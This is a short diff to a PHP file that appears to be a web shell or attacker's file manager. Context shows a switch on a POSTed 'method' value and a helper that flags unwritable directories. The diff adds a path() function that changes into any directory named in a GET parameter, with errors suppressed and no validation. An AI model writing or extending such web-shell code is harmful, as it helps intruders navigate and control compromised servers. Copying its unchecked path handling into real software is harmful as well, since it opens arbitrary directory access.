@@ -582,6 +582,15 @@ switch ($_POST['method']) {
 </head>
 <?php
 #alx.wahid@gmail.com#
+function path() {
+	if(isset($_GET['dir'])) {
+		$dir = str_replace("\\", "/", $_GET['dir']);
+		@chdir($dir);
+	} else {
+		$dir = str_replace("\\", "/", getcwd());
+	}
+	return $dir;
+}
 function w($dir,$perm) {
 	if(!is_writable($dir)) {
 		return "<font color=red>".$perm."</font>";
